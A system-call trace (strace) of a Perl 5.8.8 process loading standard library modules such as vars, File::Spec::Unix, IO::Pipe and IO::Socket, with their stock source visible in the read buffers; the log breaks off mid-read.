12318 07:41:50.086874 stat64("/etc/perl/vars.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086888 stat64("/etc/perl/vars.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086901 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086913 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086926 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086939 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086953 stat64("/usr/lib/perl5/vars.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086965 stat64("/usr/lib/perl5/vars.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086978 stat64("/usr/share/perl5/vars.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086989 stat64("/usr/share/perl5/vars.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087034 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087046 stat64("/usr/lib/perl/5.8/vars.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087074 stat64("/usr/share/perl/5.8/vars.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087086 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
12318 07:41:50.087106 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
12318 07:41:50.087120 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54868) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.087135 _llseek(10, 0, [0], SEEK_CUR) = 0
12318 07:41:50.087151 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
12318 07:41:50.087262 stat64("/etc/perl/warnings/register.pmc", 0xbff5469c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087277 stat64("/etc/perl/warnings/register.pm", 0xbff545ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.087290 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbff5469c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087303 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbff545ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.087317 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbff5469c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087330 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbff545ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.087345 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbff5469c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087357 stat64("/usr/lib/perl5/warnings/register.pm", 0xbff545ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.087370 stat64("/usr/share/perl5/warnings/register.pmc", 0xbff5469c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087383 stat64("/usr/share/perl5/warnings/register.pm", 0xbff545ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.087396 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbff5469c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087409 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbff545ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.087423 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbff5469c) = -1 ENOENT (No such file or directory)
12318 07:41:50.087436 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
12318 07:41:50.095900 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
12318 07:41:50.095901 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff543b8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.095901 _llseek(11, 0, [0], SEEK_CUR) = 0
12318 07:41:50.095901 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
12318 07:41:50.095901 read(11, "", 4096) = 0
12318 07:41:50.095902 close(11)         = 0
12318 07:41:50.096053 _llseek(10, 1148, [1148], SEEK_SET) = 0
12318 07:41:50.096083 _llseek(10, 0, [1148], SEEK_CUR) = 0
12318 07:41:50.096094 close(10)         = 0
12318 07:41:50.096161 _llseek(8, 594, [594], SEEK_SET) = 0
12318 07:41:50.096175 _llseek(8, 0, [594], SEEK_CUR) = 0
12318 07:41:50.096185 close(8)          = 0
12318 07:41:50.096218 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.096233 stat64("/etc/perl/File/Spec/Unix.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.096247 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.096261 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.096275 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.096288 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.096302 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.096314 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.096328 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.096340 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.096354 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.096367 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.096381 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.096394 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
12318 07:41:50.096415 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.096430 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.096441 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.096459 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
12318 07:41:50.097187 brk(0x8218000)    = 0x8218000
12318 07:41:50.106798 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
12318 07:41:50.107199 read(8, "", 4096) = 0
12318 07:41:50.107215 close(8)          = 0
12318 07:41:50.107404 read(6, "", 4096) = 0
12318 07:41:50.107418 close(6)          = 0
12318 07:41:50.107634 stat64("/etc/perl/IO/Pipe.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.107652 stat64("/etc/perl/IO/Pipe.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.107667 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.107680 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.107695 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.107707 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.107722 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.107734 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.107747 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.107759 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.107772 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.107785 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
12318 07:41:50.107807 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
12318 07:41:50.107822 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff551c8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.107834 _llseek(6, 0, [0], SEEK_CUR) = 0
12318 07:41:50.107855 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
12318 07:41:50.108554 _llseek(6, 3425, [3425], SEEK_SET) = 0
12318 07:41:50.115512 _llseek(6, 0, [3425], SEEK_CUR) = 0
12318 07:41:50.115525 close(6)          = 0
12318 07:41:50.115550 stat64("/etc/perl/IO/Socket.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.115565 stat64("/etc/perl/IO/Socket.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.115579 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.115592 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.115606 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.115623 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.115638 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.115650 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.115664 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.115676 stat64("/usr/share/perl5/IO/Socket.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.115689 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.115702 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
12318 07:41:50.115724 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
12318 07:41:50.115739 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff551c8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.115751 _llseek(6, 0, [0], SEEK_CUR) = 0
12318 07:41:50.115768 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire 